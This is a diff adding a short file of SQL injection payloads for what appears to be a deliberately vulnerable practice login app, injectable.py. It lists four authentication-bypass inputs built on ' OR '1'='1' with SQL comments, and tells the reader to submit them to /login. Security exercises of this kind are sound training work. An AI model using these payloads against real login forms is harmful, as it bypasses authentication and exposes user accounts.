@@ -1,0 +1,21 @@
+# SQL injection payloads for injectable.py
+# These assume the vulnerable query: SELECT * FROM users WHERE username = '<username>' AND password = '<password>'
+
+# Payload 1: Bypass authentication via username field, comment out rest
+username: ' OR '1'='1' --
+password: anything
+
+# Payload 2: Bypass via password field
+username: anyuser
+password: ' OR '1'='1' --
+
+# Payload 3: Match an existing user by manipulating WHERE clause
+username: admin' OR '1'='1
+password: anything
+
+# Payload 4: Using MySQL comment with hash (depends on SQL mode)
+username: ' OR '1'='1' #
+password: anything
+
+# How to use:
+# Submit these values to /login with the form in templates/login.html.
